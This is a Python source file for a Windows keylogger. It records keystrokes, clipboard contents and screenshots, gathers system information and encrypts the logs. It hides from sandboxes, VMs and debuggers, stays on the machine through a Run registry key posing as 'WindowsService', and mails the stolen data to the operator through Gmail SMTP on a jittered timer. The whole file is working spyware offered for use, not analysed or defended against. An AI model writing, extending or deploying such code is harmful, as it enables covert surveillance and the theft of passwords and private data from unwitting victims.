#!/usr/bin/env python3
"""
Modular Windows keylogger with reliable SMTP exfiltration and stealth features.

Assumes all required third-party modules are installed in the source environment:
    pynput, pywin32, pillow, pycryptodome, psutil, requests (for com_info)
"""

import os
import sys
import time
import threading
import socket
import shutil
import secrets
import hashlib
import logging
import subprocess
from datetime import datetime
from pathlib import Path
from collections import deque
from typing import List

# Third-party modules (assumed present)
import pynput.keyboard as pk
import win32clipboard
from PIL import ImageGrab
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import scrypt
from Crypto.Random import get_random_bytes

# External com_info module (must be in the same directory)
from com_info import fetch_info as fetch_system_info

# ----------------------------------------------------------------------
#  Minimal logging (disabled in production)
# ----------------------------------------------------------------------
logging.basicConfig(level=logging.ERROR, format='[%(levelname)s] %(message)s')
log = logging.getLogger('keylogger')

# Encryption flag – always True since pycryptodome is installed
HAS_CRYPTO = True

# ----------------------------------------------------------------------
#  Anti‑analysis helpers
# ----------------------------------------------------------------------
def in_sandbox() -> bool:
    """Basic checks to avoid running in VMs or sandboxes."""
    import uuid
    vm_macs = ["00:05:69", "00:0C:29", "00:1C:14", "00:50:56"]
    try:
        mac = uuid.getnode()
        mac_str = ':'.join(f'{(mac >> 40) & 0xff:02x}:{(mac >> 32) & 0xff:02x}:{(mac >> 24) & 0xff:02x}:{(mac >> 16) & 0xff:02x}:{(mac >> 8) & 0xff:02x}:{mac & 0xff:02x}')
        for prefix in vm_macs:
            if mac_str.startswith(prefix):
                return True
    except Exception:
        pass

    try:
        import ctypes
        free_bytes = ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.GetDiskFreeSpaceExW(
            'C:\\', None, None, ctypes.byref(free_bytes))
        if free_bytes.value < 20 * 1024**3:
            return True
    except Exception:
        pass

    if sys.gettrace() is not None:
        return True

    return False


def should_exit() -> bool:
    return in_sandbox()

# ----------------------------------------------------------------------
#  Security helpers (encryption)
# ----------------------------------------------------------------------
class Encryptor:
    """AES-GCM encryption for log files."""

    def __init__(self, password: bytes):
        salt = b'KeyloggerSalt2024'
        self.key = scrypt(password, salt, 32, N=2**14, r=8, p=1)

    def encrypt(self, plaintext: bytes) -> bytes:
        nonce = get_random_bytes(12)
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        return ciphertext + nonce + tag

    def decrypt(self, encrypted: bytes) -> bytes:
        tag = encrypted[-16:]
        nonce = encrypted[-28:-16]
        ciphertext = encrypted[:-28]
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)


def generate_machine_specific_seed() -> str:
    """Derive a unique string from machine that changes only if major HW changes."""
    import uuid
    mac = hex(uuid.getnode())
    host = socket.gethostname()
    return hashlib.sha256(f'{mac}{host}'.encode()).hexdigest()


class KeyLogger:
    """Main class that manages capture, persistence, and exfiltration."""

    def __init__(self, config: dict):
        """
        config must contain:
          email:    SMTP sender/recipient
          password: SMTP password
          interval: base reporting interval in seconds (optional, default 300)
        """
        self.email = config.get('email')
        self.password = config.get('password')
        self.interval = config.get('interval', 300)

        seed = generate_machine_specific_seed()
        rng = secrets.SystemRandom(seed)
        self._appdata = Path(os.environ['APPDATA'])
        self._log_dir = self._appdata / f'logs_{rng.randint(1000, 9999)}'
        self._keylog_file = 'keylog.dat'
        self._sysinfo_prefix = 'sysinfo'
        self._ss_folder = 'ss_cache'

        self.encryptor = Encryptor(seed.encode())

        self.log_buffer = ''
        self.unsent_logs = deque()
        self.clipboard_text = ''
        self.ss_error = ''
        self.screenshot_list = deque()
        self.ss_enter_count = 0
        self.ss_delete_count = 0
        self.running = True
        self.report_lock = threading.Lock()

        self._log_dir.mkdir(exist_ok=True)
        (self._log_dir / self._ss_folder).mkdir(exist_ok=True)
        self.debug = False

    # ---------- Persistence ----------
    def become_persistent(self):
        try:
            exe_path = self._appdata / f'syscache_{secrets.randbelow(1000):03d}.exe'
            if not exe_path.exists():
                shutil.copyfile(sys.executable, exe_path)
                cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsService /t REG_SZ /d "{exe_path}" /f'
                subprocess.run(cmd, shell=True, capture_output=True)
        except Exception as e:
            log.error('Persistence failed: %s', e)

    # ---------- Keystroke handling ----------
    def _on_press(self, key):
        try:
            char = key.char
            current = str(char)
        except AttributeError:
            if key == pk.Key.space:
                current = ' '
            elif key == pk.Key.enter:
                current = ' <ENTER>\n'
                if self.ss_enter_count < 10:
                    self._take_screenshot()
                    self.ss_enter_count += 1
            elif key == pk.Key.delete:
                current = ' <DEL> '
                if self.ss_delete_count < 5:
                    self._take_screenshot()
                    self.ss_delete_count += 1
            elif key == pk.Key.esc:
                current = ' <ESC> '
            elif key == pk.Key.tab:
                current = ' <TAB> '
            else:
                current = f' <{str(key).upper()}> '
        self.log_buffer += current

    # ---------- Data collection helpers ----------
    def _dump_clipboard(self):
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            self.clipboard_text = data
        except Exception:
            try:
                win32clipboard.CloseClipboard()
            except:
                pass
            self.clipboard_text = '\nFailed to read clipboard\n'

    def _take_screenshot(self):
        try:
            img = ImageGrab.grab()
            stamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
            filename = f'ss_{stamp}.png'
            img.save(self._log_dir / self._ss_folder / filename)
            self.screenshot_list.append(filename)
            self.ss_error = ''
        except Exception as e:
            self.ss_error = f'Screenshot error: {e}'

    def _collect_system_info(self) -> List[str]:
        base_path = self._log_dir / self._sysinfo_prefix
        try:
            return fetch_system_info(str(base_path))
        except Exception as e:
            log.error('System info collection failed: %s', e)
            return []

    # ---------- Log file operations (encrypted) ----------
    def _read_existing_keylog(self) -> str:
        path = self._log_dir / self._keylog_file
        if not path.exists():
            return ''
        with open(path, 'rb') as f:
            data = f.read()
        try:
            return self.encryptor.decrypt(data).decode('utf-8')
        except Exception:
            return '[Decryption error]\n'

    def _write_keylog(self, content: str):
        data = content.encode('utf-8')
        encrypted = self.encryptor.encrypt(data)
        with open(self._log_dir / self._keylog_file, 'wb') as f:
            f.write(encrypted)

    # ---------- Report assembly ----------
    def _prepare_report(self) -> str:
        self._dump_clipboard()
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        report = f'=== Keystrokes at {now} ===\n'
        report += self.log_buffer
        report += '\n\n=== Clipboard ===\n' + self.clipboard_text

        if self.unsent_logs:
            report += '\n=== PREVIOUS UNSENT LOGS ===\n'
            while self.unsent_logs:
                old = self.unsent_logs.popleft()
                report += old + '\n***\n'

        if self.ss_error:
            report += f'\n{self.ss_error}\n'

        self.log_buffer = ''
        self.clipboard_text = ''
        self.ss_error = ''
        return report

    # ---------- Exfiltration (SMTP only) ----------
    def _send_smtp(self, subject: str, attachments: List[Path]) -> bool:
        if not self.email or not self.password:
            return False
        try:
            from email.mime.multipart import MIMEMultipart
            from email.mime.base import MIMEBase
            from email import encoders
            import smtplib

            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = subject

            for path in attachments:
                if not path.exists():
                    continue
                with open(path, 'rb') as f:
                    payload = f.read()
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(payload)
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={path.name}')
                msg.attach(part)

            with smtplib.SMTP('smtp.gmail.com', 587, timeout=10) as s:
                s.starttls()
                s.login(self.email, self.password)
                s.sendmail(self.email, self.email, msg.as_string())
            return True
        except Exception as e:
            log.error('SMTP send failed: %s', e)
            return False

    def _exfiltrate(self, report_text: str, sysinfo_files: List[str]):
        self._write_keylog(report_text)
        attachments = [self._log_dir / self._keylog_file]
        for path in sysinfo_files:
            p = Path(path)
            if p.exists():
                attachments.append(p)
        while self.screenshot_list:
            screenshot = self.screenshot_list[0]
            path = self._log_dir / self._ss_folder / screenshot
            if path.exists():
                attachments.append(path)
            self.screenshot_list.popleft()

        subject = f'Log from {socket.gethostname()} @ {datetime.now()}'
        success = self._send_smtp(subject, attachments)

        if success:
            for path in sysinfo_files:
                try:
                    Path(path).unlink(missing_ok=True)
                except Exception:
                    pass
            ss_dir = self._log_dir / self._ss_folder
            for f in ss_dir.iterdir():
                try:
                    f.unlink()
                except Exception:
                    pass
            self.ss_enter_count = 0
            self.ss_delete_count = 0
        else:
            self.unsent_logs.append(report_text)
            log.warning('SMTP failed; log queued for retry.')

    # ---------- Main loop ----------
    def _report(self):
        with self.report_lock:
            self._take_screenshot()
            report = self._prepare_report()
            sysinfo_files = self._collect_system_info()
            self._exfiltrate(report, sysinfo_files)

    def _schedule_next(self):
        if not self.running:
            return
        base = self.interval
        jitter = secrets.randbelow(int(base * 0.2))
        delay = base + jitter
        timer = threading.Timer(delay, self._run_cycle)
        timer.daemon = True
        timer.start()

    def _run_cycle(self):
        self._report()
        self._schedule_next()

    def start(self):
        if should_exit():
            return
        self.become_persistent()
        self._schedule_next()
        listener = pk.Listener(on_press=self._on_press)
        with listener:
            listener.join()

    def stop(self):
        self.running = False